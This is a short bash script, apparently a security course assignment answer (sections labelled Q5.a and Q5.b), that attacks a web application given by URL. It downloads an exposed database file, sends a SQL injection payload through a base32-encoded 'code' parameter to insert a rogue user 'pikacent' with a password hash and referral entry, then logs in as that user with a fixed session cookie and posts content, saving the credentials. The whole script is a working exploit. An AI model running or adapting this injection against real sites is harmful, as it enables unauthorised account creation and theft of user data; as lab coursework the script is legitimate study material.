#!/bin/bash

if [ $# -ne 1 ]
then
echo "Usage: $0 <url>"
exit 1
fi

base32_encode() {
  echo -n "$1" | base32
}

user="thefreespirit"
encoded_user=$(base32_encode "$user")

new_user="pikacent"
encoded_new_user=$(base32_encode "$new_user")

#Q5.a
response1=$(curl "$1/docs/website_db.db" > data.db)

#Q5.b.i
response2=$(curl -i -G "$1/confirm.php" \
--data-urlencode "code=$encoded_user'; INSERT INTO users VALUES('$new_user','b2e98ad6f6eb8508dd6a14cfa704bad7f05f6fb1','$encoded_new_user' ,1); INSERT INTO ref VALUES(7,10); --" )

response3=$(curl -i "$1/logout.php" \
-H 'Cookie: CS458=kievuopie976rminqolhat0225')


#Q5.b.ii
response4=$(curl -i "$1/post.php" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: CS458=kievuopie976rminqolhat0225' \
-d "username=pikacent&password=Password123&form=login")

response5=$(curl -i "$1/post.php" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: CS458=kievuopie976rminqolhat0225' \
-d'title=Q5 pikacent Account&content=I am a newly created user&type=1&form=content&submit=')

echo "$response1"$'\n\n'"$response2"$'\n\n'"$response3"$'\n\n'"$response4"$'\n\n'"$response5" > response.txt
echo "$response1"$'\n\n'"$response2"$'\n\n'"$response3"$'\n\n'"$response4"$'\n\n'"$response5"


echo "$new_user"$'\n'"Password123" > credentials.txt

 